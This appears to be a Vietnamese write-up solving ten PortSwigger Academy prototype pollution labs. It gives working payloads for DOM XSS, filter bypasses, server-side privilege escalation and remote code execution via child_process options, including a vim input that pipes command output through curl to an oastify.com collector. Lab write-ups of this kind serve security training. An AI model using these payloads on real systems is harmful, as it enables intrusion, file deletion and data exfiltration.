# 1. DOM XSS via client-side prototype pollution
Trong source code của home page, nhận thấy có hai resource script `deparam.js` và `searchLogger.js`. Trong đó, `deparam.js` có chức năng chuyển query string thành một object chức các tham số trong đó.

Nội dung của `searchLogger.js`:
```
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```
Từ đoạn code trên, ta thấy nếu có thể thiết lập giá trị `config.transport_url=data:,alert(1)//` thì sẽ tạo được thẻ script và execute lệnh alert. Đây có thể trở thành prototype pollution sink.

Gửi request `/?search=x&__proto__[abc]=hello`, sau đó vào tab console nhập `Object.prototype.abc`, ta được giá trị `hello`. Như vậy, query string trong home page chính là một prototype pollution source. Ta thay đổi request thành `/?search=x&__proto__[transport_url]=data:,alert(1)//` rồi submit, kết quả bài lab được giải.

Nguyên nhân lệnh alert được execute là vì `config.transport_url` trong trường hợp này có giá trị `undefined`, do đó javascript sẽ tiếp tục tìm lên prototype của nó, đến khi gặp `Object.prototype.transport_url` có giá trị là `data:,alert(1)//` thì nó sẽ dừng lại. Kết quả, một thẻ script có thể thực thi lệnh alert được inject vào website.

# 2. DOM XSS via an alternative prototype pollution vector
Sử dụng DOM Invader, ta tìm được một source trong home page:

![image](https://user-images.githubusercontent.com/103978452/228148651-65df9309-3148-48a3-be19-5018cab74ac5.png)

Sau khi click "Test", ta thấy với request `GET /?__proto__.testproperty=DOM_INVADER_PP_POC` thì `Object.prototype.testproperty` sẽ trả về giá trị `DOM_INVADER_PP_POC`. Như vậy, đây là một prototype pollution source.

Tiếp tục sử dụng DOM Invader, ta tìm được một sink:

![image](https://user-images.githubusercontent.com/103978452/228149105-bbd2dbbf-0bfb-46b9-b2e9-7af34c790bfb.png)

```
eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
```
Trong hàm eval có phép nối chuỗi bằng toán từ `+`, như vậy ta hoàn toàn có thể exploit XSS bằng cách cấu hình `manager.sequence=)};alert(1)//`. 

Dùng browser gửi request `GET /?__proto__.sequence=)};alert(1);//`. Khi đó, `Object.prototype.sequence` sẽ có giá trị là `)};alert(1)//` và nếu object `manager` không có property `sequence`, nó sẽ tìm ngược lên prototype và lấy giá trị của `Object.prototype.sequence`. Như vậy, lệnh alert được thực thi và bài lab được giải.

# 3. Client-side prototype pollution via flawed sanitization
Nhận thấy trong file `searchLoggerFiltered.js` có đoạn code sau:
```
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}
```
Khối lệnh `if(config.transport_url){ ... }` sẽ kiểm tra `config.transport_url`, nếu tìm thấy sẽ tạo thẻ script với thuộc tính src có giá trị là giá trị của `config.transport_url`.

Như vậy, ta thấy query string là một source và đoạn code tạo tag script chính là sink. Tuy nhiên, website đã chặn prototype pollution attack bằng cách thay thế tất cả từ khóa "constructor", "__proto__", "prototype" bằng chuỗi rỗng. Tuy nhiên, ta có thể dễ dàng bypass bằng cách chèn payload "__pro__proto__to__". Dùng browser truy cập đường dẫn `/?__pro__proto__to__[transport_url]=data:,alert(1)//`, kết quả lệnh alert được thực thi và bài lab được giải.

# 4. Client-side prototype pollution in third-party libraries
Sử dụng DOM Invader, ta tìm được source:

![image](https://user-images.githubusercontent.com/103978452/228156551-1c4b9b6e-c016-434e-b040-7689a1d6ac51.png)

Click "Test", ta tìm được sink:

![image](https://user-images.githubusercontent.com/103978452/228156684-a08b0834-75ab-4cc6-b1d9-dfc397c38982.png)

Khi click "Exploit", ta biết được với request `/#__proto__[hitCallback]=alert(document.cookie)` thì lệnh `alert(document.cookie)` sẽ được execute. Từ đây, ta vào exploit server cấu hình đoạn script:
```
<script>document.location="https://0abe00b1041e29cec0f640de00d600b3.web-security-academy.net/#constructor[prototype][hitCallback]=alert%28document.cookie%29";</script>
```
Sau khi click submit, bài lab được giải.

# 5. Client-side prototype pollution via browser APIs
Thử gửi request `/?__proto__[name]=abc`, sau đó vào console window in ra kết quả quả `Object.prototype.name`, ta được chuỗi `abc`. Như vậy query string trong home page là một prototype pollution sourrce.

Nhận thấy trong file `searchLoggerConfigurable.js` có đoạn code sau:
```
Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
if(config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
}
```
Nhận thấy:
+) Đoạn code trên sử dụng hàm `Object.defineProperty` để định nghĩa các descriptor cho trường `transport_url`
+) Giá trị của `transport_url` sẽ được đặt làm thuộc tính `src` của tag script
Như vậy, ta có thể exploit prototype pollution bằng cách định nghĩa thuộc tính `value` của `Object.prototype`, vì hàm trên sẽ tìm đến thuộc tính này khi giá trị `value` không được khai báo.

Từ browser, truy cập `/?__proto__[value]=data%3A%2Calert%281%29`, lệnh alert được execute và bài lab được giải.

# 6. Privilege escalation via server-side prototype pollution
Đăng nhập với credentials wiener:peter, ta thấy request `POST /my-account/change-address` nhận vào một chuỗi JSON và cũng trả về một chuỗi JSON trong response, trong đó có reflect dữ liệu đầu vào.

Ta gửi request với body như sau:
```
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"GZmsBz9dBDd40xsKNITU288ljrUhuIPH","isAdmin":true,"__proto__": {"test":"test_value"}}
```
Response trả về:
```
{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false,"test":"test_value"}
```
Như vậy, có thể dự đoán rằng server side có lỗ hổng prototype pollution, và property `"test": "test_value"` đã được gán cho prototype của object.

Nhận thấy trong response có `"isAdmin":false`. Khi đó, ta hoàn toàn có thể ghi đè lên thuộc tính này bằng cách thêm `"__proto__":{"isAdmin":true}` vào trong payload. Sau khi submit, ta refresh browser và thấy "Admin panel" xuất hiện. Xóa user carlos, bài lab được giải.

# 7. Detecting server-side prototype pollution without polluted property reflection
Đăng nhập với credentials wiener:peter, ta thấy request `POST /my-account/change-address` nhận vào một chuỗi JSON và trả về JSON trong response. 

Trong chức năng change address, submit request với body chứa đoạn JSON không hợp lệ (ví dụ `"country"y:"UK"`), thì ta thấy response trả về một chuỗi JSON error:
```
{
    "error":
    {
        "expose":true,
        "statusCode":400,
        "status":400,
        "body":"{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"Osne Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\"y:\"UK\",\"sessionId\":\"sKIM2HlzOKKv5yafMtouqZ9U7mLE1TdW\"}",
        "type":"entity.parse.failed"
    }
}
```

Thử exploit prototype pollution bằng cách ghi đè status code, ta cấu hình phần body như sau:
```
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"cgYDvt1jgVprQ1RMlbmtAwUCj6qLCfeK",
    "__proto__":
    {
        "status":599
    }
}
```
Submit request trên. Sau đó, ta thử submit một request không hợp lệ, nhận thấy status code là 599. Như vậy, ta detect được website có lỗi prototype pollution, bài lab được giải.

# 8. Bypassing flawed input filters for server-side prototype pollution
Đăng nhập với credentials wiener:peter, nhận thấy trong chức năng thay đổi address, response có reflect lại các tham số trong request. Ta thử exploit bằng cách thêm `"__proto__":{"isAdmin":true}` nhưng không thành công.

Thử exploit bằng cách sử dụng constructor, ta cấu hình request với body như sau:
```
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"+AGYAbwBv-",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"4PyZOkbzhI4s0yNatSRfJ4fMc2V0qHAV",
    "constructor":
    {
        "prototype":
        {
            "isAdmin":true
        }
    }
}
```
Sau khi submit, ta thấy response trả về `"isAdmin": true`. Như vậy, refresh browser và truy cập "Admin panel" để xóa user carlos. Bài lab được giải.

# 9. Remote code execution via server-side prototype pollution
Đăng nhập với credentials wiener:peter. Nhận thấy website có 2 chức năng Thay đổi address (`POST /my-account/change-address`) và Run maintainance jobs (`POST /admin/jobs`).

Trong chức năng thay đổi address, thử submit request với body:
```
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"0jKsWkldRdMoaF6qjpZOPYZqXZekFaly",
    "x":1
}
```
thì thấy `"x":1` xuất hiện trong chuỗi JSON ở response. Để kiểm tra có thể exploit RCE hay không, ta sẽ kiểm tra website có sử dụng `child_process` module để tạo subprocess không. Cấu hình request:
```
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"0jKsWkldRdMoaF6qjpZOPYZqXZekFaly",
    "x":1,
    "__proto__":
    {
        "shell":"node",
        "NODE_OPTIONS":"--inspect=6lsd6beb6b63ptv8hgda7cit0k6auz.oastify.com"
    }
}
```
sau đó, click "Run maintainance jobs" (dự đoán website sẽ tạo subprocess với chức năng này), kết quả Burp Collaborator Client hiển thị thông tin có request kết nối đến. Như vậy ta xác nhận được rằng website sử dụng ` `child_process` module. Tiếp đó, để exploit ta cấu hình request với body:
```
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"0jKsWkldRdMoaF6qjpZOPYZqXZekFaly",
    "x":1,
    "__proto__":
    {
        "shell":"node",
        "execArgv":
        [
            "--eval=require('fs')",
            "--eval=fs.unlinkSync('/home/carlos/morale.txt')"
        ]
    }
}
```
Request trên sẽ cấu hình các biến số cho subprocess bằng method `child_process.fork()`, khiến cho lệnh `require('fs')` và `fs.unlinkSync('/home/carlos/morale')` được thực hiện. Sau khi submit và click "Run maintainance jobs", bài lab được giải.

# 10. Exfiltrating sensitive data via server-side prototype pollution
Đăng nhập với credentials wiener:peter, ta thấy có các chức năng tương tự lab #9, và ta có thể detect lỗ hổng prototype pollution bằng cách tương tự.

Trong chức năng thay đổi address, cấu hình request:
```
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"JUURtveIt2PKjp9otNRvZ5sb9hlEwwq0",
    "x":1,
    "__proto__":
    {
        "shell":"node",
        "NODE_OPTIONS":"--inspect=6y5xldxdz9g834nbbaklw77fh6nxbm.oastify.com"
    }
}
```
ta thấy Burp Collaborator hiển thị thông tin request đến, như vậy website có sử dụng `child_process` module để tạo subprocess. Tiếp đó, để thực thi RCE ta cấu hình request với body sau:
```
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"PcyfX9WgZwrKRkHjAXg0dq3eOHX5OgM6",
    "x":1,
    "__proto__":
    {
        "shell":"vim",
        "input":":! ls|curl -X POST jsfafqrqtmalxhho5neyqk1sbjhf54.oastify.com -d @- \n"
    }
}
```
Vào Burp Collaborator, ta thấy một POST request được gửi đến với phần body có content là `node_appssecret`

![image](https://user-images.githubusercontent.com/103978452/228772028-da73927c-cfa0-4b09-a19d-bc9969bcafd2.png)

Tiếp đó, ta thay đổi `"input":":! ls|curl -X POST jsfafqrqtmalxhho5neyqk1sbjhf54.oastify.com -d @- \n". Vào Burp Collaborator, ta thu được chuỗi secret đang tìm:

![image](https://user-images.githubusercontent.com/103978452/228772320-aeda9fcd-10b2-4d37-bf07-198ba76b648b.png)

Dùng thông tin thu được để Submit solution, kết quả bài lab được giải.
